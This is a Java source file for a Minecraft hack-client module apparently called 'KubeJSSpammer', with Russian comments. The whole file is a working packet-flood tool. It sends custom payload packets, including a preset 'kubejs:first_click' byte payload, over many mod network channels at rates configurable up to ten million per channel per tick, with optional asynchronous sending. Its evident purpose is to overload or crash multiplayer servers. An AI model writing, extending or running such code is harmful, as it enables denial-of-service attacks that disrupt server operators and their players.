package team.xenobyte.modern.module.impl;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.protocol.game.ServerboundCustomPayloadPacket;
import net.minecraft.resources.ResourceLocation;
import team.xenobyte.modern.bootstrap.BootstrapLog;
import team.xenobyte.modern.gui.ModuleMessageLog;
import team.xenobyte.modern.module.Category;
import team.xenobyte.modern.module.ModuleMode;
import team.xenobyte.modern.module.XenoModule;
import team.xenobyte.modern.module.setting.ModuleSetting;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class KubeJSSpammer extends XenoModule {
    // Настройки
    private final ModuleSetting packetsPerTick = setting("PacketsPerTick",
            ModuleSetting.number("PacketsPerTick", 100, 1, 10000000, 1));
    private final ModuleSetting burstDelay = setting("BurstDelay",
            ModuleSetting.number("BurstDelay", 0, 0, 20, 1));
    private final ModuleSetting asyncSend = setting("AsyncSend",
            ModuleSetting.bool("AsyncSend", true));

    // Каналы (включаем/отключаем)
    private final ModuleSetting channelArchitectury = setting("Architectury",
            ModuleSetting.bool("Architectury", true));
    private final ModuleSetting channelGetrade = setting("Getrade",
            ModuleSetting.bool("Getrade", true));
    private final ModuleSetting channelGEBackpack = setting("GEBackpack",
            ModuleSetting.bool("GEBackpack", true));
    private final ModuleSetting channelIronJetpacks = setting("IronJetpacks",
            ModuleSetting.bool("IronJetpacks", true));
    private final ModuleSetting channelIndReborn = setting("IndReborn",
            ModuleSetting.bool("IndReborn", true));
    private final ModuleSetting channelBotania = setting("Botania",
            ModuleSetting.bool("Botania", false));
    private final ModuleSetting channelCreate = setting("Create",
            ModuleSetting.bool("Create", false));
    private final ModuleSetting channelCurios = setting("Curios",
            ModuleSetting.bool("Curios", false));

    // Payload (выбор предустановленного)
    private final ModuleSetting payloadMode = setting("PayloadMode",
            ModuleSetting.choice("PayloadMode", 0, "01", "kubejs:first_click")
                    .describe("Предустановленный payload."));

    private int tickCounter;
    private long totalSent;
    private ExecutorService executor;
    private ByteBuf sharedBuffer;
    private List<ResourceLocation> activeChannels = new ArrayList<>();

    public KubeJSSpammer() {
        super("KubeJSSpammer", Category.MISC, ModuleMode.TOGGLE);
    }

    @Override
    public void onEnable(Minecraft client) {
        tickCounter = 0;
        totalSent = 0;
        executor = Executors.newSingleThreadExecutor(r -> {
            Thread t = new Thread(r, "kubejs-spammer");
            t.setDaemon(true);
            return t;
        });

        // Собираем активные каналы
        activeChannels.clear();
        if (channelArchitectury.boolValue()) activeChannels.add(channel("architectury", "network"));
        if (channelGetrade.boolValue()) activeChannels.add(channel("getrade", "main"));
        if (channelGEBackpack.boolValue()) activeChannels.add(channel("gebackpack", "main"));
        if (channelIronJetpacks.boolValue()) activeChannels.add(channel("ironjetpacks", "main"));
        if (channelIndReborn.boolValue()) activeChannels.add(channel("ind_reborn", "networking"));
        if (channelBotania.boolValue()) activeChannels.add(channel("botania", "main"));
        if (channelCreate.boolValue()) activeChannels.add(channel("create", "main"));
        if (channelCurios.boolValue()) activeChannels.add(channel("curios", "main"));

        // Создаём буфер для payload
        byte[] payloadBytes = getPayloadBytes();
        sharedBuffer = Unpooled.buffer(payloadBytes.length);
        sharedBuffer.writeBytes(payloadBytes);

        ModuleMessageLog.push("Spammer", "KubeJS спаммер включён! Каналов: " + activeChannels.size() + ", пакетов/канал/тик: " + packetsPerTick.intValue());
        BootstrapLog.info("KubeJSSpammer enabled: " + activeChannels.size() + " channels, " + packetsPerTick.intValue() + " pkt/channel/tick");
    }

    @Override
    public void onDisable(Minecraft client) {
        if (executor != null) {
            executor.shutdownNow();
            executor = null;
        }
        if (sharedBuffer != null) {
            sharedBuffer.release();
            sharedBuffer = null;
        }
        ModuleMessageLog.push("Spammer", "Всего отправлено: " + totalSent);
        BootstrapLog.info("KubeJSSpammer disabled, totalSent=" + totalSent);
    }

    @Override
    public void onTick(Minecraft client) {
        if (client.getConnection() == null || client.player == null || activeChannels.isEmpty()) {
            return;
        }

        tickCounter++;
        if (burstDelay.intValue() > 0 && tickCounter % burstDelay.intValue() != 0) {
            return;
        }

        int perChannel = packetsPerTick.intValue();
        int totalPackets = perChannel * activeChannels.size();
        totalSent += totalPackets;

        if (asyncSend.boolValue()) {
            executor.execute(() -> {
                for (ResourceLocation channel : activeChannels) {
                    for (int i = 0; i < perChannel; i++) {
                        sendPacket(client, channel);
                    }
                }
            });
        } else {
            for (ResourceLocation channel : activeChannels) {
                for (int i = 0; i < perChannel; i++) {
                    sendPacket(client, channel);
                }
            }
        }

        if (tickCounter % 20 == 0) {
            BootstrapLog.info("KubeJS spam: channels=" + activeChannels.size() + ", sent=" + totalPackets + ", total=" + totalSent);
        }
    }

    private void sendPacket(Minecraft client, ResourceLocation channel) {
        ByteBuf copy = sharedBuffer.copy();
        FriendlyByteBuf buf = new FriendlyByteBuf(copy);
        ServerboundCustomPayloadPacket packet = new ServerboundCustomPayloadPacket(channel, buf);
        client.getConnection().send(packet);
    }

    private byte[] getPayloadBytes() {
        String mode = payloadMode.choiceValue();
        switch (mode) {
            case "kubejs:first_click":
                return new byte[]{
                    0x12, 0x6b, 0x75, 0x62, 0x65, 0x6a, 0x73, 0x3a,
                    0x66, 0x69, 0x72, 0x73, 0x74, 0x5f, 0x63, 0x6c,
                    0x69, 0x63, 0x6b, 0x01
                };
            default: // "01"
                return new byte[]{0x01};
        }
    }

    private static ResourceLocation channel(String namespace, String path) {
        return Objects.requireNonNull(ResourceLocation.tryBuild(namespace, path));
    }

    @Override
    public String description() {
        return "Спамит пакеты по выбранным каналам с предустановленным payload.";
    }

    @Override
    public String runtimeInfo(Minecraft client) {
        return "KubeJS spam: " + activeChannels.size() + " каналов, всего=" + totalSent;
    }
}
